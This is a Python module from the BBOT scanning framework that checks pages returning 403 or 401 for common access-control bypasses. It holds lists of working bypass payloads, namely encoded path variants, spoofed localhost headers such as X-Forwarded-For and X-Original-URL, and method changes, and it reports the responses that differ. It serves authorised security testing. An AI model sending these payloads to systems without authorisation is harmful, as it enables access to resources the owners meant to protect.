from bbot.errors import HttpCompareError
from bbot.modules.base import BaseModule

"""
Port of https://github.com/iamj0ker/bypass-403/ and https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122
"""

# ([string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
signatures = [
    ("GET", "{scheme}://{netloc}/%2e/{path}", None, False),
    ("GET", "{scheme}://{netloc}/{path}", {"X-Original-URL": "{path}"}, False),
    ("GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, False),
    ("GET", "{scheme}://{netloc}/{path}", {"X-rewrite-url": "nonsense"}, False),
    ("GET", "{scheme}://{netloc}/{path}.html", None, False),
    ("GET", "{scheme}://{netloc}/{path}#", None, False),
    ("POST", "{scheme}://{netloc}/{path}", {"Content-Length": "0"}, False),
    ("GET", "{scheme}://{netloc}/{path}.php", None, False),
    ("GET", "{scheme}://{netloc}/{path}.json", None, False),
    ("TRACE", "{scheme}://{netloc}/{path}", None, True),
    ("GET", "{scheme}://{netloc}/(S(X))/{path}", None, True),  # ASPNET COOKIELESS URLS
    ("GET", "{scheme}://{netloc}/(S(X))/../(S(X))/{path}", None, True),  # ASPNET COOKIELESS URLS
]


query_payloads = [
    "%09",
    "%20",
    "%23",
    "%2e",
    "%2f",
    ".",
    "?",
    ";",
    "..;",
    ";%09",
    ";%09..",
    ";%09..;",
    ";%2f..",
    "*",
    "/*",
    "..;/",
    ";/",
    "/..;/",
    "/;/",
    "/./",
    "//",
    "/.",
    "/?anything",
]

header_payloads = {
    "Client-IP": "127.0.0.1",
    "X-Real-Ip": "127.0.0.1",
    "Redirect": "127.0.0.1",
    "Referer": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-By": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Forwarded-Port": "80",
    "X-True-IP": "127.0.0.1",
    "X-Host": "127.0.0.1",
}

# This is planned to be replaced in the future: https://github.com/blacklanternsecurity/bbot/issues/1068
waf_strings = ["The requested URL was rejected"]

for qp in query_payloads:
    signatures.append(("GET", "{scheme}://{netloc}/{path}%s" % qp, None, True))
    if "?" not in qp:  # we only want to use "?" after the path
        signatures.append(("GET", "{scheme}://{netloc}/%s/{path}" % qp, None, True))

for hp_key in header_payloads.keys():
    signatures.append(("GET", "{scheme}://{netloc}/{path}", {hp_key: header_payloads[hp_key]}, False))


class bypass403(BaseModule):
    watched_events = ["URL"]
    produced_events = ["FINDING"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {"description": "Check 403 pages for common bypasses", "created_date": "2022-07-05", "author": "@liquidsec"}
    in_scope_only = True

    async def do_checks(self, compare_helper, event, collapse_threshold):
        results = set()
        error_count = 0

        for sig in signatures:
            if error_count > 3:
                self.warning(f"Received too many errors for URL {event.data} aborting bypass403")
                return None

            sig = self.format_signature(sig, event)
            if sig[2] != None:
                headers = dict(sig[2])
            else:
                headers = None
            try:
                match, reasons, reflection, subject_response = await compare_helper.compare(
                    sig[1], headers=headers, method=sig[0], allow_redirects=True
                )
            except HttpCompareError as e:
                error_count += 1
                self.debug(e)
                continue

            # In some cases WAFs will respond with a 200 code which causes a false positive
            if subject_response != None:
                for ws in waf_strings:
                    if ws in subject_response.text:
                        self.debug("Rejecting result based on presence of WAF string")
                        return

            if match == False:
                if str(subject_response.status_code)[0] != "4":
                    if sig[2]:
                        added_header_tuple = next(iter(sig[2].items()))
                        reported_signature = f"Added Header: {added_header_tuple[0]}: {added_header_tuple[1]}"
                    else:
                        reported_signature = f"Modified URL: {sig[0]} {sig[1]}"
                    description = f"403 Bypass Reasons: [{','.join(reasons)}] Sig: [{reported_signature}]"
                    results.add(description)
                    if len(results) > collapse_threshold:
                        return results
                else:
                    self.debug(f"Status code changed to {str(subject_response.status_code)}, ignoring")
        return results

    async def handle_event(self, event):
        try:
            compare_helper = self.helpers.http_compare(event.data, allow_redirects=True)
        except HttpCompareError as e:
            self.debug(e)
            return

        collapse_threshold = 6
        results = await self.do_checks(compare_helper, event, collapse_threshold)
        if results is None:
            return
        if len(results) > collapse_threshold:
            await self.emit_event(
                {
                    "description": f"403 Bypass MULTIPLE SIGNATURES (exceeded threshold {str(collapse_threshold)})",
                    "host": str(event.host),
                    "url": event.data,
                },
                "FINDING",
                parent=event,
                context=f"{{module}} discovered multiple potential 403 bypasses ({{event.type}}) for {event.data}",
            )
        else:
            for description in results:
                await self.emit_event(
                    {"description": description, "host": str(event.host), "url": event.data},
                    "FINDING",
                    parent=event,
                    context=f"{{module}} discovered potential 403 bypass ({{event.type}}) for {event.data}",
                )

    # When a WAF-check helper is available in the future, we will convert to HTTP_RESPONSE and check for the WAF string here.
    async def filter_event(self, event):
        if ("status-403" in event.tags) or ("status-401" in event.tags):
            return True
        return False

    def format_signature(self, sig, event):
        if sig[3] == True:
            cleaned_path = event.parsed_url.path.strip("/")
        else:
            cleaned_path = event.parsed_url.path.lstrip("/")
        kwargs = {"scheme": event.parsed_url.scheme, "netloc": event.parsed_url.netloc, "path": cleaned_path}
        formatted_url = sig[1].format(**kwargs)
        if sig[2] != None:
            formatted_headers = {k: v.format(**kwargs) for k, v in sig[2].items()}
        else:
            formatted_headers = None
        return (sig[0], formatted_url, formatted_headers)
